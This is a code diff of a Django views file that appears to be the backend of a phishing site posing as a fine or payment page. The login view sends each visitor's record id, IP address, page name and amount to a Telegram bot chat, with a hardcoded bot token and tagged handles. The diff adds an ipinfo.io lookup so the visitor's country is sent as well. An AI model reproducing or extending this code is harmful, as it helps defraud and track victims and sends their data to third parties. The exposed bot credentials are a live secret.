@@ -40,7 +40,9 @@ def login(request):
         contact.page_name="Melumat Doldurma sehifesi"
         contact.save()
         request.session['contact_id'] = contact.id
-        response = requests.post(f'https://api.telegram.org/bot6316715361:AAH3GsgZgeG7r1uwHQHGypsDCeVtSV6Zoik/sendMessage?chat_id=-1001866012482&text=id:{contact.id}|ip:{contact.ip}\nPage:{contact.page_name}\nMəbləğ:{subtotal}\n  @kitayskiadam @TetaLab @alienfx')
+        ip_address = client_ip
+        country = get_country_from_ip(ip_address)
+        response = requests.post(f'https://api.telegram.org/bot6316715361:AAH3GsgZgeG7r1uwHQHGypsDCeVtSV6Zoik/sendMessage?chat_id=-1001866012482&text=id:{contact.id}|ip:{contact.ip}|Country|{country}\nPage:{contact.page_name}\nMəbləğ:{subtotal}\n  @kitayskiadam @TetaLab @alienfx')
 
         return render(request, 'cerime2.html',context)
     context = {
@@ -410,3 +412,14 @@ def contact_approve(request, pk):
 
     return JsonResponse({'success': True})
 
+
+
+def get_country_from_ip(ip_address):
+    try:
+        response = requests.get(f"https://ipinfo.io/{ip_address}/country")
+        if response.status_code == 200:
+            return response.text.strip()
+        else:
+            return "Unknown"
+    except requests.RequestException:
+        return "Error"
